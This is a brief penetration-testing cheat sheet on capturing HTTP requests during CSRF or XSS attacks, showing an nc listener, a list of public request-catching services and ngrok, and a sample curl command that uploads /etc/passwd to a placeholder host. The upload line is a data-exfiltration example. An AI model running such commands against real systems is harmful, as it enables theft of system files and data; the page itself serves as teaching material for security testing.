# Request Grabber

<div class="row row-cols-lg-2"><div>

During pentesting activies, we may want to catch HTTP requests, such as during a CSRF attack or a XSS attack.

If our machine is within the same network, we can use `nc`:

```shell!
$ nc -lnvp PORT
<send request to YOUR_PUBLIC_IP:PORT>
```

We can use [responder](/cybersecurity/red-team/tools/utilities/networking/responder.md) for Windows Authentication Requests.
</div><div>

We may use online public solutions such as API Testing Platforms:

* [requestbin](https://public.requestbin.com/r/) <small>(HTTP 🌍)</small>
* [postbin](https://www.toptal.com/developers/postbin/) <small>(HTTP 🌍)</small>
* [ngrok](https://ngrok.com/) <small>(HTTP 🌍 and TCP ⭐, account required 🪦)</small>
* [requestinspector](https://requestinspector.com/) <small>(HTTP 🌍)</small>
* [beeceptor](https://beeceptor.com/) <small>(HTTP 🌍)</small>
* ...

```ps
$ curl http://XXX/xxxxxx -F "data=@/etc/passwd"
```
</div></div>